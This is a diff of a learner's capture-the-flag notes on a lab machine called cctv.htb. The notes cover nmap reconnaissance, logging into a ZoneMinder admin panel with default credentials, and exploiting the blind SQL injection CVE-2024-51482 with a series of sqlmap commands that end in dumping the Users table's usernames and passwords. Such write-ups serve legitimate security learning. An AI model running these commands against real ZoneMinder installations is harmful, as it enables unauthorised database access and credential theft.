@@ -1,63 +1,174 @@
-Reconnaissance
--started nmap 
-  --Port 80(HTTP) and port 22(SSH) active 
+# Reconnaissance & Enumeration Notes
 
-{
-  sudo nano /etc/hosts (incase the site failes to load,it is used for mapping cctv.htb to the ip )
-  added ip and domain name
-}
-Enumeration 
--used browser to go into website
--checking the functionality 
--has a button "Get a Quote"
-  --intial observation:seems to redirect to an original google mail website with https connection(howerver a box appears before this)
--there is a staff login 
-open -a warning is provided by the browser that "the connection is not secure .Credentials entered could be compromised"
-  --intial observation:most probably our attack vector
-just typed in
---username:admin
---password:admin
---logged in 
---seem to have complete access to admin
---lots of options but most seems dummy
---found api 
----admin,mark and super admin(no idea what to do with it )
----found logs(one log has /usr/share/zoneminder/www/includes/actions/options.php,another has 	/usr/share/zoneminder/www/includes/auth.php)
-----too many things ,probably many rabbit holes .
---performing dir enumeration using gobuster
--- no idea what to do -possibly have to do vertical/horizontal escalation 
-from the path zoneminder is the software -has many known vuln 
+## Reconnaissance
 
+- Started nmap  
+  - Port 80 (HTTP) and Port 22 (SSH) active  
 
-  
+- Used:
+  sudo nano /etc/hosts  
+  (in case the site fails to load, it is used for mapping cctv.htb to the ip)  
+  Added ip and domain name  
 
+---
 
-    
+## Enumeration
 
+- Used browser to go into website  
+- Checking the functionality  
 
+- Has a button "Get a Quote"  
+  - initial observation: seems to redirect to an original google mail website with https connection (however a box appears before this)  
 
+- There is a staff login  
+  - a warning is provided by the browser that "the connection is not secure .Credentials entered could be compromised"  
+  - initial observation: most probably our attack vector  
 
+- Just typed in:  
+  username: admin  
+  password: admin  
 
+- Logged in  
+  - seem to have complete access to admin  
+  - lots of options but most seems dummy  
 
+---
 
+## Further Enumeration
 
+- Found API  
+  - admin, mark and super admin (no idea what to do with it)  
 
+- Found logs  
+  - /usr/share/zoneminder/www/includes/actions/options.php  
+  - /usr/share/zoneminder/www/includes/auth.php  
 
+- Too many things, probably many rabbit holes  
 
-HYPERTEXT PROTOCOL (HTTP,PORT 80)
-HTTP is the protocol used to load websites.
-Your browser sends a request to:
-       IP of the server
-       Port 80
-Not encrypted 
-Data is sent in plain text
-Vulnerable to attacks (MITM, sniffing)
+---
 
-SECURE SHELL(SSH PORT 22)
-SSH lets you securely connect to another computer remotely.
-  ssh user@192.168.1.10
-Encrypted communication 
-Used by:
-System admins
-Hackers / pentesters
-Gives command-line access to another machine
+## Directory Enumeration
+
+- Performing dir enumeration using gobuster  
+- No idea what to do  
+- Possibly have to do vertical/horizontal escalation  
+
+---
+
+## Vulnerability Identification
+
+- From the path zoneminder is the software  
+- Has many known vulnerabilities  
+
+- Found CVE-2024-51482  
+  - Critical Boolean-based Blind SQL Injection vulnerability in ZoneMinder  
+
+- Trigger URL:  
+  http://[TARGET]/zm/index.php?view=request&request=event&action=removetag&tid=[INJECTION_POINT]  
+
+---
+
+## SQLMap Exploitation
+
+### Initial Command
+
+sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=*" \
+--cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
+--dbms=mysql --level=3 --risk=2 --batch --current-db --threads=5  
+
+### Explanation
+
+- --dbms=mysql  
+  ZoneMinder uses MySQL/MariaDB  
+
+- --level=3  
+  Increases payload variety  
+
+- --risk=2  
+  Allows heavy OR-based tests  
+
+- --technique=B  
+  Boolean-based blind  
+
+- --threads=5  
+  Speeds up extraction  
+
+- --current-db  
+  Retrieves database name  
+
+---
+
+## Modified Command (Time-Based Injection)
+
+sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*" \
+--cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
+--dbms=mysql --batch --level=5 --risk=3 \
+--technique=T --time-sec=5 --threads=1 \
+--current-db  
+
+### Notes
+
+- Technique changed from B to T (Boolean → Time-based)  
+- Uses sleep to time the response  
+- Must use 1 thread (avoid timing conflicts)  
+- --time-sec=5 ensures clear delay  
+
+- This gives the current database:  
+  zm  
+
+---
+
+## Database Enumeration
+
+### Get Tables
+
+sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*" \
+--cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
+--dbms=mysql --batch -D zm --tables  
+
+- -D is the database  
+
+---
+
+### Get Columns
+
+sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*" \
+--cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
+--dbms=mysql --batch -D zm -T Users --columns  
+
+- -T is the table name  
+
+---
+
+### Dump Credentials
+
+sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1*" \
+--cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
+--dbms=mysql --batch -D zm -T Users -C "Username,Password" --dump  
+
+---
+
+## Concepts
+
+### HTTP (Port 80)
+
+- HTTP is the protocol used to load websites  
+- Browser sends request to:
+  - IP of the server  
+  - Port 80  
+
+- Not encrypted  
+- Data is sent in plain text  
+- Vulnerable to attacks (MITM, sniffing)  
+
+---
+
+### SSH (Port 22)
+
+- SSH lets you securely connect to another computer remotely  
+
+ssh user@192.168.1.10  
+
+- Encrypted communication  
+- Used by system admins and pentesters  
+- Provides command-line access to another machine  
